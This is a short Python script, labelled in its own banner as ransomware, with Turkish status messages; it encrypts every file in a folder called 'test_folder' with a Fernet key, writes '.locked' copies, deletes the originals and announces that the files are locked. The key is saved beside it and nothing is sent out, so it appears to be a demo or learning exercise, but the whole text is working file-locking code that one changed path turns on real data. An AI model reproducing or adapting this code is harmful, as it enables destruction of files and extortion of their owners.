from cryptography.fernet import Fernet
import os

print("--- FOLDER ENCRYPTOR (RANSOMWARE) ---")

key = Fernet.generate_key()
cipher = Fernet(key)

with open("MASTER_KEY.key", "wb") as k: k.write(key)

target_folder = "test_folder" 
if not os.path.exists(target_folder):
    os.makedirs(target_folder)
    print(f"[*] '{target_folder}' oluşturuldu. İçine dosya koyup tekrar çalıştır.")
else:
    for file in os.listdir(target_folder):
        path = os.path.join(target_folder, file)
        if os.path.isfile(path):
            with open(path, "rb") as f: original = f.read()
            encrypted = cipher.encrypt(original)
            with open(path + ".locked", "wb") as f: f.write(encrypted)
            os.remove(path)
            print(f"🔒 Şifrelendi: {file}")

    print("\n😱 DOSYALAR KİLİTLENDİ! Anahtar: MASTER_KEY.key")